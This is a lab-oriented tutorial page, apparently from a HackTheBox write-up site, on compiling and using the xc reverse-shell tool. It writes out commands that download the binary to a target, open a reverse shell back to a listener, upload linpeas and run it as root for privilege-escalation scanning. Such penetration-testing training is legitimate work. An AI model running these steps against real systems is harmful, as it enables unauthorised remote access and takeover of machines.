---
search:
  exclude: true
---
# xc Setup

![](xc.png)

## Introduction :

[xc](https://github.com/xct/xc) is an alternative improvement to the netcat utility that was made by [xct](https://app.hackthebox.eu/profile/13569) one of the top hackthebox users, it was written in golang and allows for a whole range of options like uploading, downloading, port local/remote port forwarding, or just spawning a shell on the remote server.

## **Installation**
    
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [~/HTB/Servmon]
    → sudo apt install golang-go
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [~/HTB/Servmon]
    → git clone https://github.com/xct/xc ; cd xc
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [~/HTB/Servmon]
    → go version
    go version go1.15.9 linux/amd64
    
    

We first need go version 1.15+ to be able to compile the xc binary, then clone the xc repository, then we follow the setup steps on the README.md:
    
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [HTB/Servmon/xc]
    → go get golang.org/x/sys/...
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [HTB/Servmon/xc]
    → go get golang.org/x/text/encoding/unicode
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [HTB/Servmon/xc]
    → go get github.com/hashicorp/yamux
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [HTB/Servmon/xc]
    → go get github.com/ropnop/go-clr
    package github.com/ropnop/go-clr: build constraints exclude all Go files in /home/nothing/go/src/github.com/ropnop/go-clr
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [HTB/Servmon/xc]
    → pip3 install donut-shellcode
    Collecting donut-shellcode
      Downloading donut-shellcode-0.9.2.tar.gz (149 kB)
         |████████████████████████████████| 149 kB 2.0 MB/s
    Building wheels for collected packages: donut-shellcode
      Building wheel for donut-shellcode (setup.py) ... done
      Created wheel for donut-shellcode: filename=donut_shellcode-0.9.2-cp39-cp39-linux_x86_64.whl size=56786 sha256=0e6037e945da6f8496c98bdb849a13ca84339af1ef50166a7480d6477d9729b8
      Stored in directory: /home/nothing/.cache/pip/wheels/ac/72/45/1a77c4737812b5635cd958224c0ff623ebcef62c15ef083bab
    Successfully built donut-shellcode
    Installing collected packages: donut-shellcode
    Successfully installed donut-shellcode-0.9.2
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [HTB/Servmon/xc]
    → sudo apt install rlwrap upx -y
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [HTB/Servmon/xc]
    → make
    
    

## **Basic Usage**
    
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [HTB/Servmon/xc]
    → ls -lash | grep xc
    1.3M -rwxr-xr-x  1 nothing nothing 1.3M May 30 14:03 xc
    3.2M -rwxr-xr-x  1 nothing nothing 3.2M May 30 14:03 xc.exe
    4.0K -rw-r--r--  1 nothing nothing 2.7K May 30 14:03 xc.go
    
    [ 10.10.14.13/23 ] [ /dev/pts/43 ] [HTB/Servmon/xc]
    → file xc xc.exe xc.go
    xc:     ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), statically linked, no section header
    xc.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
    xc.go:  C source, ASCII text
    
    

So now we successfully compiled xc for both linux and windows, let's test the linux version on a remote host:
    
    
    [ 10.10.14.13/23 ] [ /dev/pts/76 ] [HTB/Servmon/xc]
    → ls -lash | grep xc
    1.3M -rwxr-xr-x  1 nothing nothing 1.3M May 30 14:03 xc
    3.2M -rwxr-xr-x  1 nothing nothing 3.2M May 30 14:03 xc.exe
    4.0K -rw-r--r--  1 nothing nothing 2.7K May 30 14:03 xc.go
    
    [ 10.10.14.13/23 ] [ /dev/pts/76 ] [HTB/Servmon/xc]
    → python3 -m http.server 9090
    Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
    
    

Now from the remote host we download the compiled binary file:
    
    
    root@home:/tmp# which wget curl
    /usr/bin/wget
    /usr/bin/curl
    
    root@home:/tmp# wget http://10.0.0.10:9090/xc -O /tmp/xc
    --2021-06-02 13:52:14--  http://10.0.0.10:9090/xc
    Connecting to 10.0.0.10:9090... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 1298072 (1.2M) [application/octet-stream]
    Saving to: ‘/tmp/xc’
    
    /tmp/xc                                       100%[===============================================================================================>]   1.24M  --.-KB/s    in 0.1s
    
    2021-06-02 13:52:14 (11.4 MB/s) - ‘/tmp/xc’ saved [1298072/1298072]
    
    

Now that xc is on both machines, let's start to use it:
    
    
    [ 10.10.14.13/23 ] [ /dev/pts/76 ] [HTB/Servmon/xc]
    → ./xc
    Usage:
    - Client: xc ip port
    - Server: xc -l -p port
    
    [ 10.10.14.13/23 ] [ /dev/pts/76 ] [HTB/Servmon/xc]
    → ./xc -l -p 9003
    
    
                    __  _____
                    \ \/ / __|
                    >  <****(__
                    /_/\_\___| by @xct_de
                               build: QUnVVFdLYEkibcKx
    
    2021/06/02 13:54:35 Listening on :9003
    2021/06/02 13:54:35 Waiting for connections...

Now that our local host is listening on port 9003, let's go on the remote host to send the reverse shell connection on our local port:
    
    
    
    root@home:/tmp# ./xc
    Usage:
    - Client: xc ip port
    - Server: xc -l -p port
    root@home:/tmp# ./xc 10.0.0.10 9003
    2021/06/02 13:57:30 Connected to 10.0.0.10:9003
    
    

Back to our local host we see that we catched the incoming reverse shell connection:
    
    
    [ 10.10.14.13/23 ] [ /dev/pts/76 ] [HTB/Servmon/xc]
    → ./xc -l -p 9003
    
                    __  _____
                    \ \/ / __|
                    >  ****(__
                    /_/\_\___| by @xct_de
                               build: QUnVVFdLYEkibcKx
    
    2021/06/02 13:54:35 Listening on :9003
    2021/06/02 13:54:35 Waiting for connections...
    2021/06/02 13:57:45 Connection from 10.0.0.101:36398
    2021/06/02 13:57:45 Stream established
    
    [*] Auto-Plugins:
    [xc: /tmp]: !help
    Usage:
    └ Shared Commands:  !exit
      !upload src dst
       * uploads a file to the target
      !download src dst
       * downloads a file from the target
      !lfwd localport remoteaddr remoteport
       * local portforwarding (like ssh -L)
      !rfwd remoteport localaddr localport
       * remote portforwarding (like ssh -R)
      !lsfwd
       * lists active forwards
      !rmfwd index
       * removes forward by index
      !plugins
       * lists available plugins
      !plugin plugin
       * execute a plugin
      !spawn port
       * spawns another client on the specified port
      !shell
       * runs /bin/sh
      !runas username password domain
       * restart xc with the specified user
      !met port
       * connects to a x64/meterpreter/reverse_tcp listener
      !restart
       * restarts the xc client
    └ OS Specific Commands:
     !ssh port
       * starts sshd with the configured keys on the specified port

Now from here we can do things like sending a file to scan the system for privilege escalation paths like [linpeas.sh](https://linpeas.sh) to do that, we simply put the script inside the directory where we started the xc listener, and we use the **!upload** function:
    
    
    [ 10.10.14.13/23 ] [ /dev/pts/77 ] [HTB/Servmon/xc]
    → locate linpeas.sh
    /home/nothing/HTB/Admirer/linpeas.sh
    /home/nothing/HTB/OpenAdmin/linpeas.sh
    /home/nothing/HTB/Postman/linpeas.sh
    /home/nothing/HTB/Traverxec/linpeas.sh
    /home/nothing/Tools/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh
    
    [ 10.10.14.13/23 ] [ /dev/pts/77 ] [HTB/Servmon/xc]
    → cp /home/nothing/Tools/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .
    
    [xc: /tmp]: !upload linpeas.sh /tmp/linpeas.sh
    [+] Upload complete
    

And then we simply spawn a shell with the **!shell** function:
    
    
    [xc: /tmp]: !shell
    
    root@home:/tmp# id
    id
    uid=0(root) gid=0(root) groups=0(root)
    
    root@home:/tmp# chmod +x /tmp/linpeas.sh
    chmod +x /tmp/linpeas.sh
    
    root@home:/tmp# /tmp/linpeas.sh
    

And that's basically how you scan a box for privesc paths. Linpeas.sh is going to scan for every tangible privilege escalation paths on the machine and use colors to display which information may be important.

![](xc1.png)

This can also be done on windows with winPEAS, you can check that out on the easy ServMon HTB box machine i made a writeup for.

